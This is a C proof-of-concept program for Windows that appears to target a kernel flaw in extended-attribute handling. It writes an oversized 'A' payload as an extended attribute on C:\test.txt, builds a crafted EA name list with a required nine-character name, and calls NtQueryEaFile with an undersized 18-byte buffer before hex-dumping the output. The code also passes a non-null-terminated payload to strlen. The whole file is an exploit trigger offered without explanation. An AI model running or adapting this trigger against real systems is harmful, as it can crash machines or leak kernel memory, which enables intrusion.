#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *NtQueryEaFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    BOOLEAN ReturnSingleEntry,
    PVOID EaList,
    ULONG EaListLength,
    PULONG EaIndex,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI* NtSetEaFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID EaBuffer,
    ULONG EaBufferSize
);

typedef struct _FILE_GET_EA_INFORMATION {
  ULONG                   NextEntryOffset;
  BYTE                    EaNameLength;
  CHAR                    EaName[1];

} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG                   NextEntryOffset;
  BYTE                    Flags;
  BYTE                    EaNameLength;
  USHORT                  EaValueLength;
  CHAR                    EaName[1];

} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

void pause_() {
    char buf[0x20] = {0, };
    scanf("%31s", buf);
    return;
}

BOOL IsAscii(char c) {
    return (c >= 32 && c <= 126);
}

void PrintHex(unsigned char *ptr, size_t size) {
    for (int i=0; i<size; i+=16) {
        for (int j=0; j<16; j++) {
            printf("%02x ", ptr[i+j]);
        }
        for (int j=0; j<16; j++) {
            if (IsAscii(ptr[i+j])) {
                printf("%c", ptr[i+j]);
            }
            else {
                printf(".");
            }
        }
        printf("\n");
    }
}

BOOL SetEaValueToFile(HANDLE hFile, const char* eaName, const char* eaValue) {
    size_t nameLen = strlen(eaName);
    size_t valueLen = strlen(eaValue);

    size_t bufferSize = sizeof(FILE_FULL_EA_INFORMATION) - 1 + (nameLen + 1) + valueLen;

    PFILE_FULL_EA_INFORMATION eaInfo = (PFILE_FULL_EA_INFORMATION)malloc(bufferSize);
    if (!eaInfo) return FALSE;
    ZeroMemory(eaInfo, bufferSize);

    eaInfo->NextEntryOffset = 0;
    eaInfo->Flags = 0;
    eaInfo->EaNameLength = (BYTE)nameLen;
    eaInfo->EaValueLength = (USHORT)valueLen;

    memcpy(eaInfo->EaName, eaName, nameLen);
    eaInfo->EaName[nameLen] = '\0';

    memcpy(eaInfo->EaName + nameLen + 1, eaValue, valueLen);

    NtSetEaFile_t NtSetEaFile = (NtSetEaFile_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtSetEaFile");
    if (!NtSetEaFile) {
        printf("[!] NtSetEaFile failed\n");
        free(eaInfo);
        exit(-1);        
    }

    IO_STATUS_BLOCK ioStatus = {0};
    NTSTATUS status = NtSetEaFile(hFile, &ioStatus, eaInfo, (ULONG)bufferSize);

    free(eaInfo);
    return (status == 0);
}

PVOID CreateEAList(const char** eaNames, size_t eaCount, ULONG* outBufferLength) {
    if (!eaNames || eaCount == 0 || !outBufferLength)
        return NULL;

    ULONG totalSize = 0;
    for (size_t i = 0; i < eaCount; ++i) {
        size_t nameLen = strlen(eaNames[i]);
        if (nameLen > 255) return NULL;

        size_t entrySize = FIELD_OFFSET(FILE_GET_EA_INFORMATION, EaName) + nameLen + 1;
        totalSize += (ULONG)((entrySize + 3) & ~3);
    }

    PBYTE buffer = (PBYTE)malloc(totalSize);
    if (!buffer)
        return NULL;

    PBYTE current = buffer;

    for (size_t i = 0; i < eaCount; ++i) {
        const char* name = eaNames[i];
        size_t nameLen = strlen(name);

        size_t entrySize = FIELD_OFFSET(FILE_GET_EA_INFORMATION, EaName) + nameLen + 1;
        size_t paddedSize = (entrySize + 3) & ~3;

        PFILE_GET_EA_INFORMATION entry = (PFILE_GET_EA_INFORMATION)current;
        entry->EaNameLength = (UCHAR)nameLen;
        entry->NextEntryOffset = (i == eaCount - 1) ? 0 : (ULONG)paddedSize;

        memcpy(entry->EaName, name, nameLen);
        entry->EaName[nameLen] = 0;

        current += paddedSize;
    }

    *outBufferLength = totalSize;
    return buffer;
}

void *CreatePayload(size_t size) {
    void *ptr = malloc(size);
    
    if (!ptr) {
        printf("[!] malloc failed\n");
        exit(0);
    }
    memset(ptr, 'A', size);
    return ptr;
}

int main() {
    HANDLE hFile = CreateFileW(
        L"C:\\test.txt", 
        FILE_WRITE_EA | FILE_READ_EA,
        FILE_SHARE_READ, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS, NULL
    );
        
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW failed");
        exit(-1);
    }

    NtQueryEaFile_t NtQueryEaFile = (NtQueryEaFile_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtQueryEaFile");

    if (!NtQueryEaFile) {
        printf("[!] NtQueryEaFile failed");
        CloseHandle(hFile);
        exit(-1);
    }

    BYTE buffer[1024] = {0, };

    SetEaValueToFile(hFile, "Custom.EA", CreatePayload(0x2000));
    
    const char *names[] = { "aaaaaaaaa", "Custom.EA" }; // must be strlen(names[0]) == 9
    ULONG bufferLength = 0;
    PVOID ea = CreateEAList(names, sizeof(names) / sizeof(names[0]), &bufferLength);

    IO_STATUS_BLOCK ioStatus = {0};

    NTSTATUS status = NtQueryEaFile(hFile, &ioStatus, buffer, 18, FALSE, ea, bufferLength, NULL, TRUE);

    if (status == 0) {
        printf("NtQueryEaFile success");
    } else {
        printf("[!] NtQueryEaFile failed");
    }

    PrintHex(buffer, bufferLength);

    CloseHandle(hFile);
    return 0;
}